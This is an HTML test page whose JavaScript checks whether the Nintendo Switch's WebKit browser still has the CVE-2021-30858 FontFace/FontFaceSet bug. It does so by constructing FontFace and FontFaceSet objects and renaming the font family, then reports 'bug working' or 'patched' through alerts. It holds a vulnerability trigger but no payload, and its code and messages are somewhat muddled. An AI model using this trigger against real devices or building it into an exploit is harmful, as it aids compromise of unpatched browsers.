<!DOCTYPE html>
<html>
    <title>CVE-2021-30858 Webkit Test</title>
    <script>

        async function testwebkit() {
            try{
            alert("Testing CVE-2021-30858 on Switch Browser.. Press OK to check bug API!!!");
            let font = new FontFace('font1', 'url()',{});
            alert("FontFace(). OK.");
            var fontFaceSet = new FontFaceSet([font]);
            alert("FontFaceSet(). OK.");
            font.family = 'font2';
            document.getElementById("test").innerHTML = "FontFace() API are available on Switch Browser";
            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() API are available on Switch Browser :P!!");
              }
            catch(e){
                alert(e.message);
            }
        }

         async function testwebkit2() {
            try{
            alert("Testing CVE-2021-30858 on Switch Browser.. Rev3.\n If you receive 'there's no enought memory error msgs' means the Bug is patched.");
            let font = new FontFace("font1", '', {},ConfirmWork1());
            
            var fontFaceSet = new FontFaceSet([font],ConfirmWork2());
            
            font.family = "font2";
            //do something after the font is loaded
            NotWork();
            alert("webkit exploit patched !");
             }
            catch(e){
                alert(e.message);
            }
                  }

            function ConfirmWork1() {
            
            document.getElementById("test").innerHTML = "Proccess --> FaceFont()..BUG WORKING!!!";

            }

            function ConfirmWork2() {
            
            document.getElementById("test").innerHTML = "Proccess --> FaceFontSet()..BUG NO WORKING!!!";

            }

        function NotWork() {
            
            document.getElementById("test").innerHTML = "If you see this Msg means: BUG IS NOT WORKING OR PATCHED!!!";
           }

    </script>

    <body>
        <button onclick="testwebkit()">Test CVE Bug API On Switch FW</button>
        <button onclick="testwebkit2()">Test Bug On 8.XX FW</button>
        <p id="test">Bug Result Test...</p>
    </body>

</html>
